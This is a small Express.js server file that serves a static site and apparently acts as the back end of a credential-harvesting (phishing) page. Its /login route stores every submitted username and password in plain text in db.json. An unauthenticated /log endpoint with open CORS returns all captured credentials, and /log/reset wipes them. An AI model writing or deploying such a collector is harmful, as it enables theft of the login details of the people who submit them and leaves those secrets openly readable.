import express, { json } from "express";
import path from "node:path";
import fs from "./cyclic_fs.js";
import cors from "cors";

const PORT = 8080;
const STATIC_DIR = path.resolve("static-website");
const STATIC_DB = path.resolve("db.json");

function createApp() {
  const server = express();
  server.use(json(), cors());
  server.use(express.static(STATIC_DIR));
  return server;
}

const app = createApp();

app.get("/", (_, res) => {
  return res.sendFile(path.join(STATIC_DIR, "index.html"));
});

app.get("/log", (_, res) => {
  return res.json(get_fileLog());
});

app.post("/log/reset", (_, res) => {
  fs.writeFileSync(STATIC_DB, "[]", "utf-8");
  res.json({ reset: true });
});

app.post("/login", (req, res) => {
  const payload = req.body;
  const valid = payload && payload["username"] && payload["password"];
  if (valid) save(payload);
  return res.json({ valid });
});

app.get("/**", (_, res) => {
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`server listening on http://localhost:${PORT}`);
});

function save(params) {
  const db = get_fileLog();
  fs.writeFileSync(
    STATIC_DB,
    JSON.stringify(db.concat(params), null, 2),
    "utf-8",
  );
}

function get_fileLog() {
  let dbFile = "[]";
  try {
    dbFile = fs.readFileSync(STATIC_DB).toString("utf-8");
  } catch {}
  return JSON.parse(dbFile);
}